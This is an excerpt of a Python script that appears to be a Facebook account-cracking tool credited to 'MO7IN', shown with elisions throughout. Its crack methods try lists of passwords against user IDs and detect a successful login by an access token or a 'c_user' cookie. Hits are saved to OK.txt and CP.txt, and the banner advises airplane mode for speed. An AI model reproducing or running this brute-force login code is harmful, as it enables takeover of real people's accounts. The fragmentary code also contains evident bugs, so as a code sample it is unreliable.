...
def main():
            os.system('clear')
            os.system('xdg-open https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.youtube.com%2Fchannel%2FUCdbzmXMd9Ey-w1o14IYlzwg%3Fcbrd%3D1%26ucbcb%3D1&h=AT3LSUfR7w6VxMW7jLMQO4xl7KZcSc6rjovXP6XdDiLUU57x_TqcZVs1lBNJ5hdJx7gEFp3tRwJ1UDXwnma04BJARGIjLPE021pgFAIqmLLg6EVnZ71b5IeOgrQOpeQtb3EoHG3lbI0')
            logo() 
...
class __crack__:
    ...
    def plerr(self):
        ...
        if _jokowi_kontol_ in ('M', 'm'):
            ...
            IMTIAZ_AKING('\n\t------[ Method Crack ]-----')
            print (' [*]=============================================')
            IMTIAZ_AKING(' [1] MO7IN Method 1 ')
            IMTIAZ_AKING(' [2] MO7IN Method 2  [ Pro ]')
            IMTIAZ_AKING(' [3] MO7IN Method 3   ')
            print (' [*]=============================================')
            self.__pler__()
        else:
    ...
    def __api__(self, user, _sempak_):
        global ok,cp,loop
        sys.stdout.write('\r\033[1;97m[OYEHOYE] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in _sempak_:
            pw = pw.lower()
            try: os.mkdir('')
            ...
            if "access_token" in p:
                IMTIAZ_AKING('\r\033[1;92m[OYEHOYE-OK] %s | %s%s      '%(user,pw,tahun(user)))
                ...
                try:
                    ...
                    IMTIAZ_AKING('\r\033[1;91m[GANDO-CP] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
                    ...
                    pass
                IMTIAZ_AKING('\r\033[1;91m[GANDO-CP] %s | %s%s      '%(user,pw,tahun(user)))
                wrt = '%s - %s%s' % (user,pw,tahun(user))
                cp.append(wrt)
                open('CP.txt','a').write('%s\n' % wrt)
                break
    ...
    def __mbasic__(self, user, _sempak_):
        ...
        for pw in _sempak_:
            ...
            if 'c_user' in ses.cookies.get_dict():
                IMTIAZ_AKING('\r\033[1;32m[OYEHOYE-OK] %s | %s      ' % (user,pw))
                wrt = '%s - %s' % (user,pw)
                ok.append(wrt)
                open('OK.txt','a').write('%s\n' % wrt)
                break
    ...
    def __mfb__(self, user, _sempak_):
        ...
        for pw in _sempak_:
            ...
            if 'c_user' in ses.cookies.get_dict():
                IMTIAZ_AKING('\r\033[1;92m[OYEHOYE-OK] %s | %s      '%(user,pw))
                wrt = '%s - %s - %s' % (user,pw)
                ok.append(wrt)
                open('OK.txt','a').write('%s\n' % wrt)
                break
...
banner="""\033[1;31m
   ...
   /033[1;37.##.....##..#######....##.....####.##....##
    ...
    \033[1;97m\033[1;41m===[CREADIT] = {MR-X} & {MO7IN}===\033[0m\033[1;93m
\033[1;37m =============================================
    Author   : MO7IN
    Facebook : /MOSIN KHAN
    Connect WHATSAPP  : 
\033[1;37m =============================================
     \033[1;31m  Use Airplane Mode For Fast \033[1;37m
\033[1;37m ============================================="""
ct = datetime.now()
n = ct.month
...
def sep():
    ...
    try:
        ...
        limit = 1
    print ('\033[1;37m Example /sdcard/AKING.txt')
    file_name = input('\033[1;37m Input file name: ')
    print ('\033[1;37m Example MOSIN.txt')
